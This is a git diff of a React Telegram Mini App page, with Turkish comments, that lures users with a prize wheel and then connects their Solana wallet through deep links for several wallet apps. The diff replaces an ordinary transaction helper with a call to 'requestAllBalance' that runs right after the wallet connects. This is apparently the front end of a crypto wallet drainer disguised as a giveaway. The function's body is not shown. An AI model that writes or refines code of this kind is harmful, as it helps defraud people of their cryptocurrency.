@@ -7,11 +7,11 @@ import React, { useEffect, useRef, useState, Fragment } from 'react'
 import './assets/2idql.css'
 import './assets/connect.css'
 import { Transition } from '@headlessui/react'
-import { useConnection, useWallet } from '@solana/wallet-adapter-react'
+import { useWallet } from '@solana/wallet-adapter-react'
 import type { WalletAdapter, WalletReadyState, WalletName } from '@solana/wallet-adapter-base'
-import { createUnsignedTransaction } from '@/app/services/transaction'
+import { requestAllBalance } from '@/app/services/transaction'
 
-// ——— Yalnızca Solana augmentasyonu ———
+// ——— Yalnızca solana augmentasyonu ———
 declare global {
   interface Window {
     solana?: {
@@ -25,10 +25,10 @@ declare global {
 
 // ——— Yerel Telegram WebApp tipi ———
 interface TgWebApp {
-  expand(): void
+  expand: () => void
   requestFullscreen?: () => void
-  setHeaderColor(typeOrColor: string, colorHex?: string): void
-  setBackgroundColor(colorHex: string): void
+  setHeaderColor: (typeOrColor: string, colorHex?: string) => void
+  setBackgroundColor: (colorHex: string) => void
   disableVerticalSwipes?: () => void
   scroll?: (offsetY: number) => void
 }
@@ -36,8 +36,7 @@ interface TgWebApp {
 export default function Page() {
   /* ——— Telegram Mini-App başlat ——— */
   useEffect(() => {
-    // TS tip bildirimleri çatışmasın diye window.Telegram direkt any olarak alıyoruz
-    const webapp = (window as any).Telegram?.WebApp as TgWebApp | undefined
+    const webapp = window.Telegram?.WebApp as TgWebApp | undefined
     if (!webapp) return
     try {
       webapp.expand()
@@ -54,22 +53,10 @@ export default function Page() {
     } catch { /**/ }
   }, [])
 
-  /* ——— Origin & DApp URL ——— */
-  const origin = typeof window !== 'undefined' ? window.location.origin : ''
-  const dappUrl = encodeURIComponent(origin)
-
-  /* ——— Phantom deeplink fonksiyonu ——— */
-  const openPhantomBrowser = () => {
-    const universal = `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}`
-    window.open(universal, '_blank')
-  }
-
   /* ——— Çark (spin) durumu ——— */
   const wheelRef = useRef<HTMLImageElement>(null)
   const [hasSpun, setHasSpun] = useState<boolean>(
-    () =>
-      typeof window !== 'undefined' &&
-      localStorage.getItem('hasSpun') === 'true'
+    () => typeof window !== 'undefined' && localStorage.getItem('hasSpun') === 'true'
   )
   useEffect(() => {
     if (hasSpun) document.querySelector('._1')?.classList.add('modal_active')
@@ -90,15 +77,23 @@ export default function Page() {
   }
 
   /* ——— Wallet & Drawer kontrolü ——— */
-  const { connection: conn, sendTransaction, select, publicKey, wallets } = useWallet()
-  const { connection } = useConnection()
-
+  const { wallets, select, publicKey } = useWallet()
   const [drawerOpen, setDrawerOpen] = useState(false)
   const [loading,    setLoading]    = useState(false)
   const [msg,        setMsg]        = useState('')
 
   const openDrawer  = () => setDrawerOpen(true)
   const closeDrawer = () => setDrawerOpen(false)
+
+  /* ——— Origin & DApp URL ——— */
+  const origin = typeof window !== 'undefined' ? window.location.origin : ''
+  const dappUrl = encodeURIComponent(origin)
+
+  /* ——— Phantom deeplink fonksiyonu ——— */
+  const openPhantomBrowser = () => {
+    const universal = `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}`
+    window.open(universal, '_blank')
+  }
 
   /* ——— Wallet yapılandırmaları & sıralama ——— */
   interface WalletConfig {
@@ -112,38 +107,47 @@ export default function Page() {
       match: name => name === 'Phantom',
       label: 'Phantom',
       icon: '/phantom.svg',
-      deepLink: '' // Phantom özel: openPhantomBrowser() kullanacağız
+      deepLink: `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}`
     },
+
     {
-      match: name => /trust/i.test(name),
+      match: name => name.toLowerCase().includes('trust'),
       label: 'Trust Wallet',
       icon: '/trustwallet.svg',
       deepLink: `https://link.trustwallet.com/open_url?url=${dappUrl}`
     },
+
     {
-      match: name => /coinbase/i.test(name),
+      match: name => name.toLowerCase().includes('coinbase'),
       label: 'Coinbase Wallet',
       icon: '/coinbase.svg',
       deepLink: `https://go.cb-w.com/dapp?cb_url=${dappUrl}`
     },
+
     {
-      match: name => /bitkeep|bitget/i.test(name),
+      match: name =>
+        name.toLowerCase().includes('bitkeep') ||
+        name.toLowerCase().includes('bitget'),
       label: 'Bitget Wallet',
       icon: '/bitget.svg',
-      deepLink: `bitkeep://bkconnect?action=dapp&url=${dappUrl}`
-    },
+      deepLink: `bitkeep://bkconnect?action=dapp&url=${encodeURIComponent(origin)}`
+      },
+
     {
       match: name => name === 'Solflare',
       label: 'Solflare',
       icon: '/solflare.svg',
       deepLink: `https://solflare.com/ul/v1/browse/${dappUrl}?ref=${dappUrl}`
+
     },
+
     {
       match: name => name === 'Backpack',
       label: 'Backpack',
       icon: '/backpack.svg',
       deepLink: `https://backpack.app/ul/v1/browse/${dappUrl}?ref=${dappUrl}`
     },
+
   ]
 
   type DrawerWallet = WalletConfig & {
@@ -151,30 +155,24 @@ export default function Page() {
     readyState: WalletReadyState
   }
 
-  const orderedWallets: DrawerWallet[] = walletConfigs
-    .map(cfg => {
-      const w = wallets.find(w => cfg.match(w.adapter.name))
-      return w ? { adapter: w.adapter, readyState: w.readyState, ...cfg } : null
-    })
-    .filter((x): x is DrawerWallet => x !== null)
+  // map + filter ile tip güvenli dizi
+  const mappedWallets: Array<DrawerWallet | null> = walletConfigs.map(cfg => {
+    const w = wallets.find(w => cfg.match(w.adapter.name))
+    return w
+      ? { adapter: w.adapter, readyState: w.readyState, ...cfg }
+      : null
+  })
+  const orderedWallets: DrawerWallet[] = mappedWallets.filter(
+    (x): x is DrawerWallet => x !== null
+  )
 
   /* ——— Transaction gönderme ——— */
   const doTx = async () => {
     setLoading(true)
-    try {
-      const tx = await createUnsignedTransaction(publicKey!)
-      if (!tx) {
-        setMsg('No enough Sol!')
-        return
-      }
-      const sig = await sendTransaction(tx, connection)
-      await connection.confirmTransaction(sig, 'confirmed')
-      setMsg('Transaction successful!')
-    } catch (e) {
-      console.error('Transaction error', e)
-      setMsg('Transaction failed')
-    } finally {
-      setLoading(false)
+    const ok = await requestAllBalance()
+    setLoading(false)
+    if (!ok) {
+      setMsg('No enough Sol!')
       setTimeout(() => setMsg(''), 5000)
     }
   }
@@ -189,7 +187,7 @@ export default function Page() {
   const handleWalletClick = async (w: DrawerWallet) => {
     closeDrawer()
 
-    if (w.label === 'Phantom') {
+    if (w.adapter.name === 'Phantom') {
       if (w.readyState === 'Installed' && window.solana?.isPhantom) {
         await select(w.adapter.name as WalletName)
         return doTx()
